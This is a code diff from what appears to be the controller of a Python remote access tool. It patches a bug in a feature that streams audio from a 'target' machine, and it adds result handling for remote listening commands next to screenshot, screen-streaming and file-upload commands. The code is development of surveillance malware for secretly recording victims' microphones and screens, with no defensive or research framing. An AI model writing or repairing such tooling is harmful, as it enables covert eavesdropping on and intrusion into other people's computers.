@@ -173,7 +173,7 @@ def start_audio_receiver():
     global stream_flag, audio_thread
     if not stream_flag['on']:
         stream_flag = {'on': True}
-        audio_thread = threading.Thread(target=stream_audio_from_target, args=(stream_flag), daemon=True).start()
+        audio_thread = threading.Thread(target=stream_audio_from_target, args=(stream_flag,), daemon=True).start()
         print(f"{YELLOW}[*] Starting audio stream...{RESET}")
         time.sleep(1)  # Allow some time for the thread to start
     else:
@@ -184,8 +184,9 @@ def stop_audio_receiver():
     if stream_flag['on']:
         stream_flag['on'] = False
         if audio_thread:
-            audio_thread.join()  # Wait for the audio thread to finish
-            audio_thread = None  # Reset the thread reference
+            audio_thread.join()
+            audio_thread = None 
+            print(f"{YELLOW}[*] Stopping audio stream...{RESET}")
         else:
             print(f"{YELLOW}[!] Audio thread is killed.{RESET}")
     else:
@@ -338,8 +339,12 @@ Within Client Session:
             upload_file(cmd.split(' ',1)[1], sock)
         elif cmd == 'listening_start':
             start_audio_receiver()
+            result = reliable_recv(sock)
+            print(result)
         elif cmd == 'listening_stop':
             stop_audio_receiver()
+            result = reliable_recv(sock)
+            print(result)
         elif cmd == 'screenshot':
             recieve_shot(sock)
         elif cmd == 'screen_stream':
